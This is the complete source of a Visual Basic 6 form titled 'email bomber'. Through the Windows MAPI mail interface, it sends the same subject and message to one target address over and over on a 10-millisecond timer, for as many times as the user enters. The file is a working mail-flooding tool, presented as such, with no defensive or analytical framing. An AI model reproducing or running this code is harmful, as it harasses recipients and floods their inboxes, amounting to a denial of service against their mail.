VERSION 5.00
Object = "{20C62CAE-15DA-101B-B9A8-444553540000}#1.1#0"; "MSMAPI32.OCX"
Begin VB.Form frmMain 
   Caption         =   "email bomber"
   ClientHeight    =   4908
   ClientLeft      =   48
   ClientTop       =   288
   ClientWidth     =   7056
   LinkTopic       =   "Form1"
   ScaleHeight     =   4908
   ScaleWidth      =   7056
   StartUpPosition =   3  'Windows Default
   Begin VB.Timer tmrRun 
      Enabled         =   0   'False
      Interval        =   10
      Left            =   4200
      Top             =   120
   End
   Begin VB.TextBox txtSubject 
      Height          =   288
      Left            =   240
      TabIndex        =   4
      Text            =   "subject"
      Top             =   960
      Width           =   2532
   End
   Begin VB.TextBox txtMsg 
      Height          =   2172
      Left            =   240
      TabIndex        =   3
      Text            =   "message"
      Top             =   1440
      Width           =   3972
   End
   Begin MSMAPI.MAPIMessages MAPIMessages1 
      Left            =   5040
      Top             =   120
      _ExtentX        =   804
      _ExtentY        =   804
      _Version        =   393216
      AddressEditFieldCount=   1
      AddressModifiable=   0   'False
      AddressResolveUI=   0   'False
      FetchSorted     =   0   'False
      FetchUnreadOnly =   0   'False
   End
   Begin MSMAPI.MAPISession MAPISession1 
      Left            =   5640
      Top             =   120
      _ExtentX        =   804
      _ExtentY        =   804
      _Version        =   393216
      DownloadMail    =   -1  'True
      LogonUI         =   -1  'True
      NewSession      =   0   'False
   End
   Begin VB.TextBox txtCounter 
      Height          =   288
      Left            =   1320
      TabIndex        =   2
      Text            =   "10"
      Top             =   480
      Width           =   972
   End
   Begin VB.CommandButton cmdStart 
      Caption         =   "start"
      Height          =   372
      Left            =   240
      TabIndex        =   1
      Top             =   480
      Width           =   972
   End
   Begin VB.TextBox txtEmailAddress 
      Height          =   288
      Left            =   240
      TabIndex        =   0
      Text            =   "name@server.ext"
      Top             =   120
      Width           =   3732
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub cmdStart_Click()
    With MAPIMessages1
    .MsgIndex = -1
    .RecipDisplayName = txtEmailAddress.Text
    .MsgSubject = txtSubject.Text
    .MsgNoteText = txtMsg.Text
    .SessionID = MAPISession1.SessionID
    End With
    tmrRun.Enabled = True
End Sub

Private Sub Form_Load()
    MAPISession1.SignOn
End Sub

Private Sub Form_Unload(Cancel As Integer)
    MAPISession1.SignOff
End Sub

Private Sub tmrRun_Timer()
    MAPIMessages1.Send
    a = Val(txtCounter.Text) - 1
    txtCounter.Text = a
    If a = 0 Then tmrRun.Enabled = False
End Sub
